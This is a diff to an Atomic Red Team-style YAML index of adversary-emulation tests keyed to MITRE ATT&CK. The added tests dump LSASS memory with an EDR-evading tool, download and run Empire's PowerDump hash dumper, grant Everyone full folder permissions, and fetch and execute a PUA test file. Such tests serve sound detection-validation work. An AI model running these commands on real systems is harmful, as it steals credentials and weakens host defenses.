@@ -20956,6 +20956,43 @@ credential-access:
 '
         name: powershell
         elevation_required: true
+    - name: Dump LSASS.exe using imported Microsoft DLLs
+      auto_generated_guid: 86fc3f40-237f-4701-b155-81c01c48d697
+      description: "The memory of lsass.exe is often dumped for offline credential
+        theft attacks. This can be achieved by\nimporting built-in DLLs and calling
+        exported functions. Xordump will re-read the resulting minidump \nfile and
+        delete it immediately to avoid brittle EDR detections that signature lsass
+        minidump files.\n\nUpon successful execution, you should see the following
+        file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        xordump_exe:
+          description: Path to xordump
+          type: Path
+          default: C:\Windows\Temp\xordump.exe
+        output_file:
+          description: Path where resulting dump should be placed
+          type: Path
+          default: C:\Windows\Temp\lsass-xordump.t1003.001.dmp
+      dependencies:
+      - description: 'Computer must have xordump.exe
+
+'
+        prereq_command: 'if (Test-Path ''#{xordump_exe}'') {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"
+          -OutFile #{xordump_exe}
+
+'
+      executor:
+        command: "#{xordump_exe} -out #{output_file} -x 0x41\n"
+        cleanup_command: 'Remove-Item ${output_file} -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: true
   T1557:
     technique:
       external_references:
@@ -22732,7 +22769,7 @@ credential-access:
           Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
           Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
           Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
-          Import-Module .\PowerDump.ps1
+          Import-Module "$Env:Temp\PowerDump.ps1"
           Invoke-PowerDump
         name: powershell
         elevation_required: true
@@ -32908,7 +32945,7 @@ defense-evasion:
           description: Key we create that is used to create the CA certificate
           type: Path
           default: rootCA.key
-      dependency_executor_name: command_prompt
+      dependency_executor_name: sh
       dependencies:
       - description: 'Verify the certificate exists. It generates if not on disk.
 
@@ -32941,7 +32978,7 @@ defense-evasion:
           description: Key we create that is used to create the CA certificate
           type: Path
           default: rootCA.key
-      dependency_executor_name: command_prompt
+      dependency_executor_name: sh
       dependencies:
       - description: 'Verify the certificate exists. It generates if not on disk.
 
@@ -32957,7 +32994,7 @@ defense-evasion:
           "#{cert_filename}"
 
 '
-        name: command_prompt
+        name: sh
         elevation_required: true
     - name: Install root CA on Windows
       auto_generated_guid: 76f49d86-5eb1-461a-a032-a480f86652f1
@@ -42958,8 +42995,27 @@ defense-evasion:
           description: Path of folder to recursively set permissions on
           type: path
           default: C:\Users\Public\*
+        file_path:
+          description: Path of folder permission back
+          type: Path
+          default: "%temp%\\T1222.001-folder-perms-backup.txt"
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: 'Backup of original folder permissions should exist (for use
+          in cleanup commands)
+
+'
+        prereq_command: 'IF EXIST #{file_path} ( EXIT 0 ) ELSE ( EXIT 1 )
+
+'
+        get_prereq_command: 'icacls #{path} /save #{file_path} /t /q >nul 2>&1
+
+'
       executor:
         command: icacls "#{path}" /grant Everyone:F /T /C /Q
+        cleanup_command: 'icacls ''#{path}'' /restore #{file_path} /q >nul 2>&1
+
+'
         name: command_prompt
         elevation_required: true
   T1220:
@@ -47503,7 +47559,6 @@ discovery:
 '
       supported_platforms:
       - macos
-      - linux
       input_arguments:
         computer_name:
           description: Computer name to find a mount on.
@@ -47515,6 +47570,38 @@ discovery:
           smbutil view -g //#{computer_name}
           showmount #{computer_name}
         name: sh
+    - name: Network Share Discovery - linux
+      auto_generated_guid: 875805bc-9e86-4e87-be86-3a5527315cae
+      description: 'Network Share Discovery using smbstatus
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        package_checker:
+          description: Package checking command. Debian - dpkg -s samba
+          type: string
+          default: rpm -q samba
+        package_installer:
+          description: Package installer command. Debian - apt install samba
+          type: string
+          default: yum install -y samba
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Package with smbstatus (samba) must exist on device
+
+'
+        prereq_command: 'if #{package_checker} > /dev/null; then exit 0; else exit
+          1; fi
+
+'
+        get_prereq_command: "sudo #{package_installer} \n"
+      executor:
+        command: 'smbstatus --shares
+
+'
+        name: bash
+        elevation_require: true
     - name: Network Share Discovery command prompt
       auto_generated_guid: 20f1097d-81c1-405c-8380-32174d493bbb
       description: |
@@ -48719,7 +48806,7 @@ discovery:
       supported_platforms:
       - macos
       executor:
-        name: command_prompt
+        name: sh
         elevation_required: false
         command: |-
           /usr/libexec/PlistBuddy -c "print :CFBundleShortVersionString" /Applications/Safari.app/Contents/Info.plist
@@ -54438,6 +54525,38 @@ execution:
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
+    - name: Potentially Unwanted Applications (PUA)
+      auto_generated_guid: 02f35d62-9fdc-4a97-b899-a5d9a876d295
+      description: 'The Potentially Unwanted Applications (PUA) protection feature
+        in antivirus software can identify and block PUAs from downloading and installing
+        on endpoints in your network. These applications are not considered viruses,
+        malware, or other types of threats, but might perform actions on endpoints
+        that adversely affect their performance or use. This file is similar to EICAR
+        test virus file, but is considered a Potentially Unwanted Application (PUA)
+        instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify
+        anti-pua protection).
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        pua_url:
+          description: url to PotentiallyUnwanted.exe
+          type: url
+          default: http://amtso.eicar.org/PotentiallyUnwanted.exe
+        pua_file:
+          description: path to PotentiallyUnwanted.exe
+          type: Path
+          default: "$env:TEMP/PotentiallyUnwanted.exe"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
+          & "#{pua_file}"
+        cleanup_command: 'Remove-Item #{pua_file}
+
+'
   T1204.001:
     technique:
       created: '2020-03-11T14:43:31.706Z'
